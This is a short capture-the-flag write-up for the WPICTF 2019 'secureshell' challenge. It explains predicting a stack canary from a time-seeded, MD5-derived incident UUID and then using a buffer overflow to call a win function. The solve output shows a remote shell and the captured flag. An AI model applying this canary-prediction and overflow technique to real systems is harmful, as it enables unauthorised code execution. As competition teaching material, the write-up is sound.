# Secureshell
## TLDR
1. estimate canary from UUID
2. call winfunc using BOF

---
```
$ ./secureshell 
Welcome to the Super dooper securer shell! Now with dynamic stack canaries and incident reporting!
Enter the password
hoge
You.dumbass is not in the sudoers file.  This incident will be reported.
Incident UUID: 69f0b57d86825f19d936ed4b60b35469

attempt #2
Enter the password
hoge
You.dumbass is not in the sudoers file.  This incident will be reported.
Incident UUID: 2fd6d1b033587cb3a37bcd272b16c445

attempt #3
Enter the password

You.dumbass is not in the sudoers file.  This incident will be reported.
Incident UUID: fdda42511609810aeefb48b99a6d5b39

Too many wrong attempts, try again later
```

## Generate UUID (python peudo code)
```
t = time.time()
srand(t)
canary = rand() << 32 | rand()
md5 = hashlib.md5()
temp = md5.update(rand())

uuid = ''
for i in range(0, 16, 2):
    uuid += temp[14 - i:14 - i+2]
for i in range(0, 16, 2):
    uuid += temp[16+14 - i:16+14 - i+2]

print uuid
```

## Flag
```
$ python solve.py NOPTRACE
[+] Opening connection to secureshell.wpictf.xyz on port 31339: Done
[!] Skipping debug attach since context.noptrace==True
[*] '/home/jt/Downloads/wpictf2019/secshell/test'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  '/usr/local/lib'
UUID: b9078d9fd4302035e5f833e60093a57d
display: b9078d9fd4302035e5f833e60093a57d
true_md5: 352030d49f8d07b97da59300e633f8e5
    -> seed: 0xda687656
[*] Switching to interactive mode

$ ls
flag.txt
run_problem.sh
secureshell
$ ls
flag.txt
run_problem.sh
secureshell
$ cat f*
WPI{Loggin_Muh_Noggin}
```
WPI{Loggin_Muh_Noggin}
